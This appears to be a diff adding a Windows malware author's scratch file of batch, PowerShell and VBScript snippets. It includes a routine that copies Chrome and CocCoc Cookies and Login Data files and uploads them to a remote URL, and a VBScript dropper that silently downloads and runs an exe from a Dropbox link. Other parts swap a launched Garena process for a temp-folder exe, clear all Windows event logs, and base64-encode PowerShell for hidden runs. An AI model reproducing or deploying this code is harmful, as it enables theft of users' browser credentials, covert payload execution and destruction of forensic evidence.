@@ -1,0 +1,319 @@
+
+https://cloudaffaire.com/rest-api-using-powershell/
+https://temporary-phone-number.com/Philippines-Phone-Number/639458236587
+https://blog.sevagas.com/
+https://riptutorial.com/javascript/example/1956/recursive-settimeout
+
+https://viblo.asia/p/mot-vai-thu-thuat-css-ma-chinh-frontend-co-the-con-chua-biet-phan-1-3Q75wppeKWb
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+Set MyProcess2=chrome.exe
+Set MyProcess3=browser.exe
+set count=1
+
+set m1=popup.exe
+set files='url1','url2'
+set down=1
+set firstTime=1
+@REM if exist %TEmp%\%m1% (
+@REM 	echo xxxxx
+@REM ) else (
+@REM 	powershell "(%files%)|foreach{$fileName='%TEMP%'+'\'+(Split-Path -Path $_ -Leaf).Substring(0,(Split-Path -Path $_ -Leaf).Length-5);(new-object System.Net.WebClient).DownloadFile($_,$fileName);}"
+@REM )
+
+
+:CheckProcess_in_Loop
+cls
+
+
+Tasklist /NH /FI "imagename eq %MyProcess2%" 2>nul |find /i "%MyProcess2%" >nul
+If not errorlevel 1 (
+	if %firstTime% EQU 1 (
+		set down=1
+		set firstTime=2
+	)
+	
+	if %down% EQU 1 ( 
+		echo iiiiiiiiiiiiiiiiiiiii
+		powershell -E 
+		set down=2
+	) 
+
+	echo yes chro
+	@REM taskkill /f /im chrome.exe
+	@REM Tasklist /NH /FI "imagename eq %m1%" 2>nul |find /i "%m1%" >nul
+	@REM If not errorlevel 1 (echo ok) else (start %temp%\%m1%)
+) else (echo no)
+
+Tasklist /NH /FI "imagename eq %MyProcess3%" 2>nul |find /i "%MyProcess3%" >nul
+If not errorlevel 1 (
+	if %firstTime% EQU 1 (
+		set down=2
+		set firstTime=2
+	)
+	if %down% EQU 2 ( 
+		echo yyyyyyyyyyyyyyyyyyyyyyyyy
+		powershell "Invoke-WebRequest 'url' -OutFile 'C:\Users\HUY\Desktop\1.ico'"
+	 	set down=1
+	)
+	echo yes brow
+	@REM taskkill /f /im browser.exe
+	@REM Tasklist /NH /FI "imagename eq %m1%" 2>nul |find /i "%m1%" >nul
+	@REM If not errorlevel 1 (echo ok) else (start %temp%\%m1%)
+) else (echo no)
+
+
+if %count% EQU 1 ( 
+	@REM echo xxxxxxxxxxxxxxxxxxxxxxxx
+	Timeout /T 1 /NoBreak>nul
+	set count=2
+) else ( Timeout /T 6 /NoBreak>nul )
+
+Goto CheckProcess_in_Loop
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+function Get-Lodw($FilePath){
+    $URL = 'url';
+    $fileBytes = [System.IO.File]::ReadAllBytes($FilePath);
+    $fileEnc = [System.Text.Encoding]::GetEncoding('iso-8859-1').GetString($fileBytes);
+    $boundary = [System.Guid]::NewGuid().ToString();
+    $LF = "`r`n";
+    $bodyLines = (
+        "--$boundary",
+        "Content-Disposition: form-data; name=`"file`"; filename=`"lg.txt`"",
+        "Content-Type: application/octet-stream$LF",
+        $fileEnc,
+        "--$boundary--$LF"
+    ) -join $LF
+    Invoke-RestMethod -Uri $URL -Method Post -ContentType "multipart/form-data; boundary=`"$boundary`"" -Body $bodyLines
+}
+
+function bro($pathBro){
+	$folder = Get-ChildItem -Path $pathBro | Where-Object{($_.Name -match '(^Profile [0-9])|(^Default)') -and ($_.Mode -match 'd')};
+    if($folder){
+        foreach($file in $folder){
+            $a = "$($file.FullName)\Network\Cookies";
+            $b = "$($file.FullName)\Login Data";
+            Copy-Item $a -Destination $env:temp
+            Copy-Item $b -Destination $env:temp
+            Get-Lodw "$env:temp\Login Data"
+            Get-Lodw "$env:temp\Cookies"
+        }
+    }
+}
+
+bro "$env:LOCALAPPDATA\CocCoc\Browser\User Data\"
+bro "$env:LOCALAPPDATA\Google\Chrome\User Data\"
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+while($True) {
+	$proc = Get-Process -name "garena" -ErrorAction SilentlyContinue
+	if($proc){
+		taskkill /f /im garena.exe
+		$proc2 = Get-Process -name "gare" -ErrorAction SilentlyContinue  
+		if($proc2){
+			echo xx2
+		}else{
+			start ${env:temp}\gare.exe
+		}
+	}
+	Timeout /T 1
+}
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+$Params = @{
+    Method = "GET"
+    Uri = "url"
+    Body = $Body
+}
+
+
+$b = 4;
+
+while($True){
+	$a = (Invoke-RestMethod @Params).length;
+	if($b -ne $a){
+		start C:\Users\HUY\Desktop\x.mp4
+	}
+	Timeout /T 4
+}
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+while($True){
+	write-output asd
+	Timeout /T 4
+}
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+do {
+	$p = Test-Connection -comp google.com -count 1 -Delay 2 -Quiet
+	$b = Invoke-WebRequest -Method Get -Uri "url" -Headers @{'Accept' = 'application/json'; 'Content-Type' = 'application/json'} | Select-Object -ExpandProperty Content | ConvertFrom-Json
+} until ($p -and $b.on);
+
+
+
+$MyScript2 = @'
+	
+'@
+$MyEncodedScript = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($MyScript2))
+write-output $MyEncodedScript 
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+/////////////////////////////////////////////// xu ly process dung powershell //////////////////////////////////////////////////////
+
+
+function Get-Processid ($nameAtt, $pidd) {
+    (Get-CIMInstance -Class win32_process -filter "$nameAtt = '$pidd'")
+}
+
+$main = (Get-Process -name 1).id|ForEach-Object{(Get-Processid "parentprocessid" $_).ProcessId}
+
+(Get-Process -name browser).id|ForEach-Object{
+    $temp = (Get-Processid "ProcessId" $_).ParentProcessId;
+    if([array]::indexof($main, $temp) -lt 0){
+        echo "---------------------------------$main-------<<<<<<<<<<<<--$([array]::indexof($main, $temp))-----$temp"
+    }else{
+        echo "------------->>>>>>>>>>>---------$main---------------------$([array]::indexof($main, $temp))-----$temp"
+    }
+}
+
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+///////////////////////////////////////////// xu ly process dung powershell 2222 ///////////////////////////////////////////////////
+
+
+
+function Get-Processid ($nameAtt, $pidd) {
+    (Get-CIMInstance -Class win32_process -filter "$nameAtt = '$pidd'")
+}
+
+while($True){
+    $browser = (Get-Process -name browser).id;
+    $sfml = $(Get-Process -name 1).id;
+    if($browser){
+        if($browser -And $sfml){
+            $main = $(Get-Process -name 1).id|ForEach-Object{(Get-Processid "parentprocessid" $_).ProcessId};
+
+            (Get-Process -name browser).id|ForEach-Object{
+                    if([array]::indexof($main, $_) -gt -1){return;}
+                    $temp = (Get-Processid "ProcessId" $_).ParentProcessId;
+                    if([array]::indexof($main, $temp) -eq -1){
+                        taskkill /pid $temp;
+                    }
+            }
+        }else{
+            taskkill /im browser.exe;
+            Invoke-Item "1.vbs";
+        }
+    }
+    Start-Sleep 0.6
+}
+
+
+
+
+
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+/////////////////////////////////////////////////////// clear event logs ///////////////////////////////////////////////////////////
+
+
+//powershell
+Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }
+
+wevtutil el | Foreach-Object {wevtutil cl $_}
+
+
+
+//batch file
+for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+/////////////////////////////////////////////////////////// original vbs ///////////////////////////////////////////////////////////
+
+Option Explicit
+Dim objFSO, objFile, objWShell
+Dim strDirectory
+
+Set objWShell = WScript.CreateObject("WScript.Shell")
+
+strDirectory = objWShell.expandEnvironmentStrings("%APPDATA%\process.bat")
+
+Set objFSO = CreateObject("Scripting.FileSystemObject")
+Set objFile = objFSO.CreateTextFile(strDirectory)
+objFile.write "set files='https://www.dropbox.com/s/qlcxh19g036fag2/o.exe?dl=1'" & vbCrLf
+objFile.write "powershell " & chr(34) & "(%files%)|foreach{$fileName='%AppData%'+'\'+(Split-Path -Path $_ -Leaf).Substring(0,(Split-Path -Path $_ -Leaf).Length-5);(new-object System.Net.WebClient).DownloadFile($_,$fileName);Invoke-Item $fileName;}"& chr(34)
+objFile.Close
+
+CreateObject("WScript.Shell").Run chr(34) & "%AppData%\\process.bat" & Chr(34), 0
+
+'Set WshShell = CreateObject("WScript.Shell") 
+'WshShell.Run chr(34) & "%AppData%\\process.bat" & Chr(34), 0
+'Set WshShell = Nothing
+
+Wscript.Quit
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+///////////////////////////////////////////////////// loop check process ///////////////////////////////////////////////////////////
+
+
+Set "MyProcess=coccoc.exe"
+Set "MyProcess2=chrome.exe"
+
+
+:CheckProcess_in_Loop
+cls
+Tasklist /NH /FI "imagename eq %MyProcess%" 2>nul |find /i "%MyProcess%" >nul
+If not errorlevel 1 (Echo "%MyProcess%" is running !) else (echo "no")
+
+Tasklist /NH /FI "imagename eq %MyProcess2%" 2>nul |find /i "%MyProcess2%" >nul
+If not errorlevel 1 (Echo "%MyProcess2%" is running !) else (echo "no")
+
+Timeout /T 2000 /NoBreak>nul
+Goto CheckProcess_in_Loop
+
+
+
+
+
+////////////////// powershell
+
+$proc = Get-Process -name "browser" -ErrorAction SilentlyContinue
+if($proc){
+	echo "asd"
+}else{
+	echo "ccc"
+}
